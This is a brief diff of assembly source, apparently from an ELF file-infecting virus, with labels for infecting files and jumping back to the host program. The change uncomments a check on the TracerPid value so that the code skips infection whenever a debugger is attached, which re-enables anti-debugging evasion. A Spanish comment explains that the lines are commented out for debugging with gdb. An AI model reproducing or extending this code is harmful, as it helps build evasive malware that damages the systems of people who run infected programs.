@@ -443,8 +443,8 @@ section .text
     .check_tracerPid_value:
         ; Comentar estas 2 líneas para debug con gdb
 
-       ; cmp byte [rdi], 0x30 ; == "0"
-       ; jne .cleanup_and_jump_to_host_1
+       cmp byte [rdi], 0x30 ; == "0"
+       jne .cleanup_and_jump_to_host_1
 
     .close_status_file_and_infect:
         add rsp, 0x1000
